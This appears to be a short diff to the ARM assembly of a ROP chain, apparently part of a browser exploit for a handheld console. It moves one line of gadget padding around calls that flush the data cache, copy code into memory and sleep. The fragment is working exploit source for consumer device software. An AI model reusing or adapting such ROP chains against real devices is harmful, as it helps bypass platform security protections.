@@ -26,8 +26,8 @@ _start:
 @.org 0x128, GARBAGE
 	.word ROP_LOC+_start, POP_PC, POP_PC
 	rop_flush_data_cache(BUFFER_LOC, 0x38400)
-	.fill 2, 4, POP_PC
 @.org 0x158, GARBAGE
+	.fill 2, 4, POP_PC
 	rop_gx_texture_copy(BUFFER_LOC, 0x1F48F000, SPIDER_ARM_CODE_SIZE)
 	rop_sleep(1000000000)
 	rop_flush_data_cache(BUFFER_LOC, 0x38400)
